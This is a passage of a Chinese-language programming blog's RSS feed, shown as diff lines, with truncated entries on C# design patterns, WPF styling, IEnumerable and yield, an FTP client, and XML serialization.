+我们使用装饰器模式来解决这个问题.GoF描述为 &amp;ldquo;Attach additional responsibilities to an object dynamically. Decorators provide a flexible alternative to subclassing for extending functionality.&amp;rdquo;
+首先看一下图.理解一下这个模式中每一个类的作用
+ • Component:定义了可以动态添加功能的具体类ConcreteComponents的接口. • ConcreteComponent: 可以动态添加功能的具体类 • Decorator: 定义了动态添加到ConcreteComponent类中的功能的接口 • ConcreteDecorator: 可以添加到 ConcreteComponent.中的具体功能类.
+使用代码
+我们开一个面包店的例子.面包店卖蛋糕和甜点.客户可以买蛋糕和甜点,同时添加一些额外的东西.额外的东西包括奶油(Cream),樱桃(Cherry),香料(Scent)和会员(Name Card)
+如果我们用派生类来实现..那么我们会有如下的类 • CakeOnly • CakeWithCreamAndCherry • CakeWithCreamAndCherryAndScent • CakeWithCreamAndCherryAndScentAndNameCard • CakeWithCherryOnly • PastryOnly • PastryWithCreamAndCherry • PastryWithCreamAndCherryAndScent • PastryWithCreamAndCherryAndScentAndNameCard • PastryWithCherryOnly • 等等等等
+这简直就是噩梦..我们用装饰器模式来实现把. 首先定义Component 接口
+public abstract class BakeryComponent { public abstract string GetName(); public abstract double GetPrice(); }  前面说过了.</description>
+    </item>
+    
+    <item>
+      <title>实现IEnumerable接口&amp;理解yield关键字</title>
+      <link>https://leizhiyuan.github.io/2012/10/19/%E5%AE%9E%E7%8E%B0ienumerable%E6%8E%A5%E5%8F%A3%E7%90%86%E8%A7%A3yield%E5%85%B3%E9%94%AE%E5%AD%97/</link>
+      <pubDate>Fri, 19 Oct 2012 07:33:12 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/10/19/%E5%AE%9E%E7%8E%B0ienumerable%E6%8E%A5%E5%8F%A3%E7%90%86%E8%A7%A3yield%E5%85%B3%E9%94%AE%E5%AD%97/</guid>
+      <description>本文讨论题目的内容。然后讨论IEnumerable接口如何使得foreach语句可以使用。之后会展示如果实现自定义的集合类，该集合类实现了IEnumerable接口。Yield关键字和遍历集合后面也讨论。
+背景
+一使用集合。就发现遍历集合就跟着来了。遍历集合最好的方式是实现迭代器模式-Understanding and Implementing the Iterator Pattern in C# and C++(这篇文章我过几天翻译一下) ，C#提供foreach来以一种优雅的方式遍历
+只要集合实现了IEnumerable 接口就可以用foreach来遍历。
+使用代码
+首先先看一下内置的集合类如何使用foreach来遍历的。ArrayList实现了IEnumerable 接口。我们看一下 // 看一下实现了IEnumerable 接口的集合如何遍历 ArrayList list = new ArrayList();
+list.Add(&amp;ldquo;1&amp;rdquo;); list.Add(2); list.Add(&amp;ldquo;3&amp;rdquo;); list.Add(&amp;lsquo;4&amp;rsquo;);
+foreach (object s in list) { Console.WriteLine(s); } &amp;nbsp;
+遍历泛型集合类
+Arraylist 是一个通用集合类，遍历泛型集合类也可以。因为这些泛型集合类实现了IEnumerable&amp;lt;T&amp;gt;接口，看一下吧。 // 遍历实现了IEnumerable&amp;lt;T&amp;gt;接口的泛型类 List&amp;lt;string&amp;gt; listOfStrings = new List&amp;lt;string&amp;gt;();
+listOfStrings.Add(&amp;ldquo;one&amp;rdquo;); listOfStrings.Add(&amp;ldquo;two&amp;rdquo;); listOfStrings.Add(&amp;ldquo;three&amp;rdquo;); listOfStrings.Add(&amp;ldquo;four&amp;rdquo;);
+foreach (string s in listOfStrings) { Console.WriteLine(s); } &amp;nbsp;
+发现了吧。我们自定义的集合类或是泛型集合类应该实现IEnumerable和IEnumerable&amp;lt;T&amp;gt;接口。这样就可以遍历了。
+&amp;nbsp;
+理解yield关键字
+在写个实现接口的例子之前，先理解一下yield关键字，yield会记录集合位置。当从一个函数返回一个值的时候，yield可以用。
+如下的普通的方法。不论调用多少次，都只会返回一个return static int SimpleReturn() { return 1; return 2; return 3; }</description>
+    </item>
+    
+    <item>
+      <title>模拟Office2010文件菜单的TabControl模板</title>
+      <link>https://leizhiyuan.github.io/2012/10/17/%E6%A8%A1%E6%8B%9Foffice2010%E6%96%87%E4%BB%B6%E8%8F%9C%E5%8D%95%E7%9A%84tabcontrol%E6%A8%A1%E6%9D%BF/</link>
+      <pubDate>Wed, 17 Oct 2012 10:00:24 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/10/17/%E6%A8%A1%E6%8B%9Foffice2010%E6%96%87%E4%BB%B6%E8%8F%9C%E5%8D%95%E7%9A%84tabcontrol%E6%A8%A1%E6%9D%BF/</guid>
+      <description>这是Office2010中的文件菜单点开后的效果。本文我将以强大的WPF来实现类似的效果。希望你能有所收获。而不是只拷贝/粘贴代码而已。
+&amp;nbsp;
+开始之前。先把TabControl找个地方放着。 &amp;lt;Window x:Class=&amp;ldquo;TestClient.MainWindow&amp;rdquo;
+xmlns=&amp;#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&amp;#34; xmlns:x=&amp;#34;http://schemas.microsoft.com/winfx/2006/xaml&amp;#34; Title=&amp;#34;MainWindow&amp;#34; Height=&amp;#34;350&amp;#34; Width=&amp;#34;525&amp;#34;&amp;amp;gt; &amp;amp;lt;TabControl Name=&amp;#34;tabSteps&amp;#34;&amp;amp;gt; &amp;amp;lt;TabItem Header=&amp;#34;Info&amp;#34; IsSelected=&amp;#34;True&amp;#34;&amp;amp;gt; &amp;amp;lt;TextBlock&amp;amp;gt;Info content&amp;amp;lt;/TextBlock&amp;amp;gt; &amp;amp;lt;/TabItem&amp;amp;gt; &amp;amp;lt;TabItem Header=&amp;#34;Recent&amp;#34;&amp;amp;gt; &amp;amp;lt;TextBlock&amp;amp;gt;Recent content tab&amp;amp;lt;/TextBlock&amp;amp;gt; &amp;amp;lt;/TabItem&amp;amp;gt; &amp;amp;lt;TabItem Header=&amp;#34;New&amp;#34;&amp;amp;gt; &amp;amp;lt;TextBlock&amp;amp;gt;New content tab&amp;amp;lt;/TextBlock&amp;amp;gt; &amp;amp;lt;/TabItem&amp;amp;gt; &amp;amp;lt;TabItem Header=&amp;#34;Print&amp;#34;&amp;amp;gt; &amp;amp;lt;TextBlock&amp;amp;gt;Print content tab&amp;amp;lt;/TextBlock&amp;amp;gt; &amp;amp;lt;/TabItem&amp;amp;gt; &amp;amp;lt;TabItem Header=&amp;#34;Save &amp;amp;amp;amp; Send&amp;#34;&amp;amp;gt; &amp;amp;lt;TextBlock&amp;amp;gt;Save &amp;amp;amp;amp; send content tab&amp;amp;lt;/TextBlock&amp;amp;gt; &amp;amp;lt;/TabItem&amp;amp;gt; &amp;amp;lt;TabItem Header=&amp;#34;Help&amp;#34;&amp;amp;gt; &amp;amp;lt;TextBlock&amp;amp;gt;Help tab&amp;amp;lt;/TextBlock&amp;amp;gt; &amp;amp;lt;/TabItem&amp;amp;gt; &amp;amp;lt;/TabControl&amp;amp;gt; &amp;lt;/Window&amp;gt; &amp;nbsp;
+然后会大概是这个效果
+
+为了改变TabControl的显示效果。我们使用模板机制，我们把模板写进一个资源字典里。这样就可以重用了。添加一个资源字典的步骤如下
+右键点击工程-添加-资源字典
+然后在资源字典里添加一些代码。 &amp;lt;ControlTemplate x:Key=&amp;ldquo;OfficeTabControl&amp;rdquo; TargetType=&amp;ldquo;{x:Type TabControl}&amp;rdquo;&amp;gt;
+&amp;amp;lt;Grid&amp;amp;gt; &amp;amp;lt;Grid.ColumnDefinitions&amp;amp;gt; &amp;amp;lt;ColumnDefinition Width=&amp;#34;160&amp;#34; /&amp;amp;gt; &amp;amp;lt;ColumnDefinition/&amp;amp;gt; &amp;amp;lt;/Grid.</description>
+    </item>
+    
+    <item>
+      <title>WPF绘制圆角多边形</title>
+      <link>https://leizhiyuan.github.io/2012/10/13/wpf%E7%BB%98%E5%88%B6%E5%9C%86%E8%A7%92%E5%A4%9A%E8%BE%B9%E5%BD%A2/</link>
+      <pubDate>Sat, 13 Oct 2012 09:45:40 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/10/13/wpf%E7%BB%98%E5%88%B6%E5%9C%86%E8%A7%92%E5%A4%9A%E8%BE%B9%E5%BD%A2/</guid>
+      <description>介绍
+最近，我发现我需要个圆角多边形。而且是需要在运行时从用户界面来绘制。WPF有多边形。但是不支持圆角。我搜索了一下。也没找到可行的现成例子。于是就自己做吧。本文描述了圆角多边形的实现，也包括如何用在你的项目里。在Demo里面的RoundedCornersPolygon 类是完整的实现。
+下载的Demo包括两部分
+1. 通过XAML绘制圆角多边形
+
+2. 运行时创建圆角多边形
+
+背景 多边形可以被认为是沿着一个给定半径的圆的边缘和一些指定点/边。所构成的点的集合。
+ 在WPF中。你可以给Polygon对象的Points属性添加一系列的点来制作多边形。
+XAML方式 &amp;lt;Canvas&amp;gt; &amp;lt;Polygon Points=&amp;ldquo;10,50 180,50 180,150 10,150&amp;rdquo; StrokeThickness=&amp;ldquo;1&amp;rdquo; Stroke=&amp;ldquo;Black&amp;rdquo; /&amp;gt; &amp;lt;/Canvas&amp;gt; C#方式 var cnv = new Canvas(); var polygon = new Polygon {StrokeThickness = 1, Fill = Brushes.Black}; polygon.Points.Add(new Point(10, 50)); polygon.Points.Add(new Point(180, 50)); polygon.Points.Add(new Point(180, 150)); polygon.Points.Add(new Point(10, 150)); cnv.Children.Add(polygon); this.Content = cnv; &amp;nbsp;
+上面两个例子会输出下面的矩形
+
+使用代码 我写的RoundedCornersPolygon 类和普通的多边形类很相似。但是有更多的属性来控制圆角。首先。看一个例子。展示一下圆角矩形类的使用
+XAML方式 &amp;lt;Canvas&amp;gt; &amp;lt;CustomRoundedCornersPolygon:RoundedCornersPolygon Points=&amp;ldquo;10,50 180,50 180,150 10,150&amp;rdquo; StrokeThickness=&amp;ldquo;1&amp;rdquo; Stroke=&amp;ldquo;Black&amp;rdquo; ArcRoundness=&amp;ldquo;25&amp;rdquo; UseAnglePercentage=&amp;ldquo;False&amp;rdquo; IsClosed=&amp;ldquo;True&amp;rdquo;/&amp;gt; &amp;lt;Canvas&amp;gt; C#方式 var cnv = new Canvas();</description>
+    </item>
+    
+    <item>
+      <title>一步步教你制作WPF圆形玻璃按钮</title>
+      <link>https://leizhiyuan.github.io/2012/10/12/%E4%B8%80%E6%AD%A5%E6%AD%A5%E6%95%99%E4%BD%A0%E5%88%B6%E4%BD%9Cwpf%E5%9C%86%E5%BD%A2%E7%8E%BB%E7%92%83%E6%8C%89%E9%92%AE/</link>
+      <pubDate>Fri, 12 Oct 2012 09:31:00 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/10/12/%E4%B8%80%E6%AD%A5%E6%AD%A5%E6%95%99%E4%BD%A0%E5%88%B6%E4%BD%9Cwpf%E5%9C%86%E5%BD%A2%E7%8E%BB%E7%92%83%E6%8C%89%E9%92%AE/</guid>
+      <description>1.介绍
+从我开始使用vista的时候，我就非常喜欢它的圆形玻璃按钮。WPF最好的一个方面就是允许自定义任何控件的样式。用了一段时间的Microsoft Expression Blend后。我做出了这个样式。我觉得做的还行。因为。我决定分享。如我所说。我使用Microsoft Expression Blend来做。但是。我也是用XAML编辑器&amp;ndash;Kaxaml。
+2.概述
+玻璃按钮样式包含了三层。组织了玻璃效果（Glass Effect）和一个ContentPresenter 来存储按钮的内容。所有的这些层都在一个最外层的Grid里。当鼠标放到按钮上，按下去的时候也定义了一些触发器（Triggers），来增加一些交互。
+我把这个样式做成了资源文件。但是这个Key可以删除，来使得所有的按钮都是这个效果。
+好我们来看一下这些层次。这些被广泛应用在微软产品中的按钮。
+**3.按钮层次 **
+3.1背景层
+第一层是一个椭圆。其实是一个canvas，一会在上面画反射和折射层，填充的颜色和按钮的背景（Background）关联。
+下面是Blend中的截图
+图2  &amp;lt;!&amp;ndash; Background Layer &amp;ndash;&amp;gt; &amp;lt;Ellipse Fill=&amp;ldquo;{TemplateBinding Background}&amp;rdquo;/&amp;gt; 3.1.1折射层
+第二层模拟了光从上到下的折射。被放在反射层之前是因为，要达到反光玻璃的效果，反射层必须在按钮的中间某处有一个硬边缘。这一层实际上是另一个椭圆。但是这次。我们使用一个径向渐变（白色-透明）的填充。来模拟光的折射。渐变开始于第一层底部的中央。结束于上面的中间。然而。为了降低折射光的强度。渐变还是开始于椭圆的底部再下一点为好。可以从图上和代码里清晰的看到。  &amp;lt;!&amp;ndash; Refraction Layer &amp;ndash;&amp;gt; &amp;lt;Ellipse x:Name=&amp;ldquo;RefractionLayer&amp;rdquo;&amp;gt; &amp;lt;Ellipse.Fill&amp;gt; &amp;lt;RadialGradientBrush GradientOrigin=&amp;ldquo;0.496,1.052&amp;rdquo;&amp;gt; &amp;lt;RadialGradientBrush.RelativeTransform&amp;gt; &amp;lt;TransformGroup&amp;gt; &amp;lt;ScaleTransform CenterX=&amp;ldquo;0.5&amp;rdquo; CenterY=&amp;ldquo;0.5&amp;rdquo; ScaleX=&amp;ldquo;1.5&amp;rdquo; ScaleY=&amp;ldquo;1.5&amp;rdquo;/&amp;gt; &amp;lt;TranslateTransform X=&amp;ldquo;0.02&amp;rdquo; Y=&amp;ldquo;0.3&amp;rdquo;/&amp;gt; &amp;lt;/TransformGroup&amp;gt; &amp;lt;/RadialGradientBrush.RelativeTransform&amp;gt; &amp;lt;GradientStop Offset=&amp;ldquo;1&amp;rdquo; Color=&amp;ldquo;#00000000&amp;rdquo;/&amp;gt; &amp;lt;GradientStop Offset=&amp;ldquo;0.4&amp;rdquo; Color=&amp;ldquo;#FFFFFFFF&amp;rdquo;/&amp;gt; &amp;lt;/RadialGradientBrush&amp;gt; &amp;lt;/Ellipse.Fill&amp;gt; &amp;lt;/Ellipse&amp;gt; &amp;nbsp;
+3.1.2反射层
+第三层是光的反射层。是最难的部分。问题是反射效果不能使用任何标准的形状来画。因此。使用路径（Path）来画反射区域。当时。手工画也是可以的。但老实说。手工画图实在没什么可享受的（除非你是一个艺术家，或者有一个数位板），无论如何。我现在MS Blend中华好一个椭圆并转换成一个路径，然后我使用贝塞尔曲线点调整得到平滑的路径，你可以添加渐变到一个复杂的Path对象上。就像你对其他与定义的图形，比如椭圆，矩形所做的一样。为了得到光泽反射。我额每年需要一个透明-白色的径向渐变填充，从路径的底部开始（也就是按钮的中间某处），结束在顶部。我想如果我是一个艺术家。我会让渐变更准一点。可是我不是。因此。就这样。因为我们要把我们的按钮放在一个Grid里。所有我们设置VerticalAlignment=&amp;ldquo;Top&amp;rdquo; 这样反射区域在按钮的中间的结束了。
+图三  &amp;lt;!&amp;ndash; Reflection Layer &amp;ndash;&amp;gt; &amp;lt;Path x:Name=&amp;ldquo;ReflectionLayer&amp;rdquo; VerticalAlignment=&amp;ldquo;Top&amp;rdquo; Stretch=&amp;ldquo;Fill&amp;rdquo;&amp;gt; &amp;lt;Path.</description>
+    </item>
+    
+    <item>
+      <title>C#制作进度窗体</title>
+      <link>https://leizhiyuan.github.io/2012/10/10/c#%E5%88%B6%E4%BD%9C%E8%BF%9B%E5%BA%A6%E7%AA%97%E4%BD%93/</link>
+      <pubDate>Wed, 10 Oct 2012 09:07:41 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/10/10/c#%E5%88%B6%E4%BD%9C%E8%BF%9B%E5%BA%A6%E7%AA%97%E4%BD%93/</guid>
+      <description>介绍
+这是我在CodeProject上的第一篇文章。我希望对你有用
+当我开发软件的时候。我通常因为一个很耗时是任务需要完成。而请求让用户等待，并且通过也允许用户取消。不论我做何种操作（比如下载文件。保存大文件等等）。我都需要做下面几件事：
+ 通过一个模态对话框来让用户等待操作完成 能让用户看到进度。 能让用户随时取消。 我搜了好久也没找到拿来就能用的窗体控件，也许是我没找到。于是我自己写。。 图1  背景
+BackgroundWorker 类包含了我需要完成任务的所有东西。我只需要给他提供一个对话框。
+使用代码
+ProgressForm 包含了一个BackgroundWorker ，你要做的仅仅就是提供了一个完成工作的方法。 ProgressForm form = new ProgressForm(); form.DoWork += new ProgressForm.DoWorkEventHandler(form_DoWork); //如果想为后台任务提供参数的话 form.Argument = something; 为了开始BackgroundWorker，只需要调用ShowDialog 方法。返回值则取决于任务是怎么完成的。 DialogResult result = form.ShowDialog(); if (result == DialogResult.Cancel) { //用户点击了取消 } else if (result == DialogResult.Abort) { /未处理的异常抛出 //你可以得到异常信息 MessageBox.Show(form.Result.Error.Message); } else if (result == DialogResult.OK) { //正常完成 //结果存储在 form.Result里 } &amp;nbsp;
+最后。任务方法看起来是这样的。 void form_DoWork(ProgressForm sender, DoWorkEventArgs e) { //得到参数 object myArgument = e.</description>
+    </item>
+    
+    <item>
+      <title>C#编写FTP客户端软件</title>
+      <link>https://leizhiyuan.github.io/2012/10/09/c#%E7%BC%96%E5%86%99ftp%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BD%AF%E4%BB%B6/</link>
+      <pubDate>Tue, 09 Oct 2012 09:06:16 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/10/09/c#%E7%BC%96%E5%86%99ftp%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BD%AF%E4%BB%B6/</guid>
+      <description>1 介绍 我知道。网上有很多现成的FTP软件。但是。我们也想要了解FTP的一些底层机构，因此。 这个开源的项目在你学习FTP知识的时候也许对你有些帮组。程序的界面看起来像FileZilla，FileZilla虽然流行但是有些bug，当我打开我博客的时候总是有问题。我需要通过FTP连接我的服务器。发送文件，下载文件等等。因为。我决定写我自己的软件来处理所有的情况。FileZilla足够好。但它不是我的。
+&amp;nbsp;
+2 背景 &amp;nbsp;
+看看我们已经知道的。我们知道FTP是一个标准的基于TCP网络协议。用于从一个主机向另一个主机传输文件。它是一个C/S架构。
+&amp;nbsp;
+图2
+
+&amp;nbsp;
+FTP程序曾经是基于命令行的。我们仍沿可以通过cmd.exe连接FTP服务器。因为FTP的确可以通过命令来操作。举个例子。我们可以在命令行使用“stor”命令来发送文件。为了完成这些请求。FTP服务器需要一直运行等待即将到来的客户端请求。我们可以从来自维基百科的解释更好的理解FTP：
+&amp;nbsp;
+客户端计算机可以通过服务器的21端口和服务器通信。叫做控制连接。它在一次会话期间保持开放。第一次连接的时候。叫做数据连接,服务器可以对客户端打开20端口（主动模式），建立一条数据通路，连接上客户端传输数据。或者客户端打开一个随机的端口（被动模式），去连接服务器，来传输数据。控制连接使用一个类似Telnet的协议，被用作客户端和服务器会话管理（命令，标识，密码）。。比如。&amp;rdquo;RETR filename&amp;ldquo; 会从服务器端下载文件。
+图三
+一个完整的FTP文件传输需要建立两种类型的连接，一种为文件传输下命令，称为控制连接，另一种实现真正的文件传输，称为数据连接。
+&amp;nbsp;
+&amp;nbsp;
+服务器 通过三位ASCII的数字状态码，可能包含可选的描述信息，在控制连接上做出回应。比如。“200”或者是“200 OK”,表示上一条命令成功了。数字代表编号，描述信息给出了一些说明（比如“OK”）,或者可能是一些需要的参数(比如需要帐号来存储文件)，那么我们需要怎么做呢。很明显。发送命令，接收“OK”回应，发送数据。接收数据。完了。但是首先需要服务器已经准备好了。FTP服务器可以在主动和被动两种模式下运行。主动模式是基于服务器的连接而被动模式是基友客户端的连接。继续看。
+&amp;nbsp;
+&amp;nbsp;
+&amp;nbsp;
+在主动连接中，客户端把自己的ip和端口发送给服务器。然后服务器尝试连接到客户端，但是可能会因为防火墙的原因而被拒绝。我们在windows上都会使用反病毒/自带防火墙。是吧。那么我们来看看被动模式
+&amp;nbsp;
+在被动连接中。服务器通过一个“PASV”命令把自己的ip和端口发送给客户端。然后客户端通过该IP尝试连接服务器。对于发送文件非常有用。当我们发送文件的时候。优先使用“PASV”模式，如你们所说。大多数协议。像FTP/HTTP 使用ASCII编码，因为全球可用。因此我们会使用这种编码。你可以从下面得到FTP的命令列表
+&amp;nbsp;
+主动和被动都是对于服务器端来说的
+3 使用代码 现在我们已经为编写软件做好准备了。我们写些有用的代码吧。：）首先。我们“打开文件对话框”，集成到我们的窗体里。
+&amp;nbsp;
+3.1 资源管理器组件 &amp;nbsp;
+我们需要一个资源管理器组件在软件界面可以看到我们所有的文件。这样我们才可以选择哪些文件来发送到FTP服务器，新建一个Windows窗体控件库（下载包中提供了）
+&amp;nbsp;
+图四
+
+&amp;nbsp;
+最后看起来样子是上面这样。先添加一个TreeView，一些按钮，和一个搜索功能  TreeView.Nodes.Clear();
+TreeNode nodeD = new TreeNode();
+nodeD.Tag = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+nodeD.Text = &amp;ldquo;Desktop&amp;rdquo;;
+nodeD.ImageIndex = 10;
+nodeD.SelectedImageIndex = 10;
+TreeView.Nodes.Add(nodeD); &amp;nbsp;</description>
+    </item>
+    
+    <item>
+      <title>理解并实现生成器模式</title>
+      <link>https://leizhiyuan.github.io/2012/10/08/%E7%90%86%E8%A7%A3%E5%B9%B6%E5%AE%9E%E7%8E%B0%E7%94%9F%E6%88%90%E5%99%A8%E6%A8%A1%E5%BC%8F/</link>
+      <pubDate>Mon, 08 Oct 2012 13:11:16 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/10/08/%E7%90%86%E8%A7%A3%E5%B9%B6%E5%AE%9E%E7%8E%B0%E7%94%9F%E6%88%90%E5%99%A8%E6%A8%A1%E5%BC%8F/</guid>
+      <description>介绍 本文讨论生成器设计模式，讨论该模式什么情况下使用，怎么实现。并且。最后会有一个简单的生成器模式的实现。
+&amp;nbsp;
+背景 当我们的程序需要创建一个对象。而这个对象必须由很多不同的对象来构造的时候。为了构造最后的对象。我们不得不组合那些部分对象。最后我们会发现我们的代码被各种各样的部分对象的细节所弄的难以理解
+&amp;nbsp;
+为了说明上面的情况。我们做一个手机生产制造系统的例子。假定我们我们有一个已经安装在手机供应商那块的一个系统。现在供应商系那个要根据一些参数来创造一个新手机。比如触屏，操作系统，电池等。如果我们已经有了这些部分的对象，那么上述部分的任意组合将会导致客户端代码复杂难以管理。比如决定生产哪种手机的模块。
+&amp;nbsp;
+生成器模式目的就是解决上述问题的。GoF定义生成器模式如下：
+Separate the construction of a complex object from its representation so that the same construction process can create different representations.
+将一个复杂对象的构建与它的表示分离，使得同样的构建过程可以创建不同的表示。
+&amp;nbsp;
+&amp;nbsp;
+这个定义意味着我们不得不设计这个系统。通过一种客户端仅仅定义参数，而生成器则接管创建复杂对象 的方式。我们看一下生成器模式的类图。
+
+然后看看上图中的每一个类都表示什么
+ConcreteBuilder: 创建复杂产品的具体类.将会知道他已经创建的Product（产品），也就是他已经装配了的Product， 客户端通过该类得到Product对象.
+Builder: 创建Product的接口
+Director: 客户端代码，定义了哪些部分应该被组合在一起来创建具体的Product
+Product: 这是通过组合很多部分创建的对象
+&amp;nbsp;
+使用代码 我们现在跟随上述的定义，然后试着去实现一个基本的生成器模式
+&amp;nbsp;
+我们先在合适的地方定义Product的不同部分，我们简单的定义一些枚举类型，那么我们就可以通过组合不同的部分创建Product了。
+&amp;nbsp; // 一些helper枚举定义各种零件
+public enum ScreenType
+{
+ScreenType_TOUCH_CAPACITIVE, ScreenType_TOUCH_RESISTIVE, ScreenType_NON_TOUCH };
+public enum Battery
+{
+MAH_1000, MAH_1500, MAH_2000 };</description>
+    </item>
+    
+    <item>
+      <title>接口VS 委托</title>
+      <link>https://leizhiyuan.github.io/2012/10/07/%E6%8E%A5%E5%8F%A3vs-%E5%A7%94%E6%89%98/</link>
+      <pubDate>Sun, 07 Oct 2012 08:31:54 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/10/07/%E6%8E%A5%E5%8F%A3vs-%E5%A7%94%E6%89%98/</guid>
+      <description>背景 对于指定的任务有不同的方案可供选择，通常是很好的。因为可能某一种方案会更加适合该任务，但是有时候做决定会很难。因为这些不同的方案有其各自的优缺点。
+我经常会停下来好好想想，是不是接口比委托更适合或者是更不适合某个任务。有时候我甚至会回去看我写的代码，这些代码刚开始使用委托来实现，我后来用接口替换掉。因此，是时候写篇文章来阐述一下这两种技术的优缺点了。
+&amp;nbsp;
+性能 我经常看到有人问接口是不是比委托更快啊。或者是不是相反。通常。别人给的答案会是：
+ 接口更快。委托相当慢 委托更快，因为他们是指向方法的指针，接口则需要一个v-table(虚函数解析表)，然后找到委托 他们一样快，但委托更容易使用 &amp;nbsp;  好吧。那些都是错的。也许在.Net 1中。委托真的很慢。但是事实是：
+ 委托执行（execute）的时候更快 接口获得（get）的时候更快 在下面这段代码中：  &amp;nbsp; Action action = SomeMethod; 我们将得到一个Action(委托类型)来调用SomeMethod。问题是：委托是包含被调用方法的实例和指针的引用类型。而不仅仅只是一个指向方法的指针，通过引用类型，委托需要分配内存，因此，每一次你把一个方法变换成一个委托的时候。都会分配一个新的对象。
+如果委托是一个值类型。会有些不一样。但是他们不是。。
+另一方面，如果我们这样写代码： IRunnable runnable = this; &amp;nbsp;
+如果实现了IRunnable接口的对象。我们简单通过一个转换得到同样的引用。没有涉及内存分配。我们将可以通过下面的代码来进行速度比较：
+对于委托： Stopwatch stopwatch = new Stopwatch(); stopwatch.Start(); for(int i=0; i&amp;lt;COUNT; i++) { Action action = SomeMethod; action(); } stopwatch.Stop(); Console.WriteLine(stopwatch.Elapsed); &amp;nbsp;
+对于接口 Stopwatch stopwatch = new Stopwatch(); stopwatch.Start(); for(int i=0; i&amp;lt;COUNT; i++) { IRunnable runnable = this; runnable.</description>
+    </item>
+    
+    <item>
+      <title>YAXLib---- XML序列化神器</title>
+      <link>https://leizhiyuan.github.io/2012/10/05/yaxlib-----xml%E5%BA%8F%E5%88%97%E5%8C%96%E7%A5%9E%E5%99%A8/</link>
+      <pubDate>Fri, 05 Oct 2012 16:24:31 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/10/05/yaxlib-----xml%E5%BA%8F%E5%88%97%E5%8C%96%E7%A5%9E%E5%99%A8/</guid>
+      <description>今天早上翻译了Yet-Another-XML-Serialization-Library-for-the-NET，刚开始以为很短。翻译着发现不对。。然后你不逼你自己。怎么知道自己做不到。于是。将近4个小时把30页的文档翻译完了。因为文章很长。所以本文只列出前两部分。我把翻译好的做成了pdf，
+文档下载：XML序列化神器
+1 介绍 在本文中，会把要提到的XML序列化库叫做YAXLib，我们知道。.Net 还是提供了一些序列化功能的，尤其是XmlSerializer，该类被程序员广泛使用用来序列化对象成XML，当然，反序列化也是可以的。我认为XmlSerializer类的问题有几下几点
+ 程序员不能自由的选择生成的xml的结构 不支持序列化一些集合类，比如Dictionary&amp;lt;,&amp;gt; 或者IEnumerable&amp;lt;&amp;gt;的属性 当反序列化的时候，如果缺失了一些域，则反序列化失败，这就使得用来存储一ixekeyi被用户编辑的配置文件变得不合适了。 &amp;nbsp;  2 为什么使用YAXLib YAXLib解决上述问题的特点
+ 程序员可以决定xml文件的结构，一个属性可以是一个子元素，或者是其他属性的属性，或者是一个在类中没有对应属性的元素。 集合类也可以被序列化成一个逗号分隔（也可以是其他任何分隔符）的数据项列表，而且。为Dictionary&amp;lt;,&amp;gt;对象实现了一些特殊的格式化功能，这样，使得程序员可以完全控制生成的xml文件的结构 他支持System.Collections.Generic 命名空间中的所有泛型集合类（像Dictionary, HashSet, LinkedList, List, Queue,SortedDictionary, SortedList, 和 Stack） 和在System.Collections 命名空间中的非泛型集合类（ ArrayList, BitArray, Hashtable, Queue, SortedList, 和 Stack）非泛型集合类可以包含多种不同的对象，而且，库还支持序列化和反序列化一维，多维，不规则的数组。 支持通过对基类/接口的引用，实现对一些对象集合的序列化和反序列化。 支持多级反序列化 程序员可以为生成的xml提供注释 当进行反序列化的时候，程序员可以选择性对于那些与类的属性相关，但没有出现在xml文件中的数据应该如何处理。这种情况下可以看错是一个错误，然后类库抛出一些异常，或者记录错误，或者可以被看成一个警告，然后用程序员预定义的值赋给对应的属性，而且，程序可以可以选择忽略这个问题，相关的异常将既不抛出也不作任何记录。请查看保留空引用标识那一节 看看什么时候可以忽略孤立的数据也许对你有帮助 程序员可以自己选择错误处理规则，对于数据敏感的应用程序，程序员可以选择在任何异常的情况下，库都应该抛出并且记录异常，对于其他的一些情况（比如要求不那么高的配置文件的存储），程序员可以选择把异常仅仅看成一个警告，仅仅记录一下，让程序的其他部分继续运行。 文档下载：XML序列化神器  著作权声明：本文由http://leaver.me 翻译，欢迎转载分享。请尊重作者劳动，转载时保留该声明和作者博客链接，谢谢！</description>
+    </item>
+    
+    <item>
+      <title>关于源代码控制的五个误区</title>
+      <link>https://leizhiyuan.github.io/2012/10/04/%E5%85%B3%E4%BA%8E%E6%BA%90%E4%BB%A3%E7%A0%81%E6%8E%A7%E5%88%B6%E7%9A%84%E4%BA%94%E4%B8%AA%E8%AF%AF%E5%8C%BA/</link>
+      <pubDate>Thu, 04 Oct 2012 12:18:57 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/10/04/%E5%85%B3%E4%BA%8E%E6%BA%90%E4%BB%A3%E7%A0%81%E6%8E%A7%E5%88%B6%E7%9A%84%E4%BA%94%E4%B8%AA%E8%AF%AF%E5%8C%BA/</guid>
+      <description>上周，在Red Gate好朋友的帮助下。我发起了一个名为小竞赛赢得优秀的SQL Source Control 5份授权的活动。参加的方式很简单-分享你使用源代码控制过程中，本可以避免的最痛苦的经历
+许多痛苦的故事都出现了。但是我认为这五个获奖者的故事值得分享，并且我都做了评论，因为我觉得随着时间的流逝，这些故事依然对我们有所启发。那么，开始享受这些故事吧，我希望这些知识中的闪光点能够帮助你以后不会掉进相同的陷阱里。
+给获奖者：希望那些授权可以帮助抚慰你们关于那些已经过去的痛苦记忆。不久我会联系你们关于奖项颁发的相关事宜。
+&amp;nbsp;
+1.通过Ctrl-Z来进行源代码控制
+第一个故事来自 courtesy of MyChickenNinja ，仅仅文字就看得我头疼。在这个特殊的故事里。应用程序被前员工破坏了。。这非常头疼。但是至少还是有很多方法可以恢复代码的。如果不要求数据的话。。
